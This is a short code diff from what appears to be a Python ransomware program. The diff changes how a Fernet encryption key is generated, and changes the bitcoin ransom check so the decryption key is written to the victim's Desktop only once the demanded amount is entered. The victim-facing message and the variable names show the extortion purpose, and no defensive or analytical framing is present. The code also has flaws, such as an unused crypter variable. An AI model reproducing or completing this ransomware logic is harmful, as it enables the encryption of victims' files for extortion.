@@ -40,11 +40,13 @@ def generate_file_list(path):
 
 #Creates fernet key
 def create_key():
-    return Fernet(key)
+    key = Fernet.generate_key()
+    crypter = Fernet(key)
+    return key
 
 #Writes fernet key to text file on the desktop
 def write_key(key):
-    if bitcoin_entry.get() == how_many_bitcoins_do_we_want:
+    if bitcoin_entry.get() >= how_many_bitcoins_do_we_want:
         with open(os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') + '\\filekey.txt', 'wb') as filekey:
             filekey.write(key)
         messagebox.showinfo(title = 'Text File Created', message = "A text file has been created with the key for your files. Enter it into the input field below to get your files back. Thank you for your cooperation.")
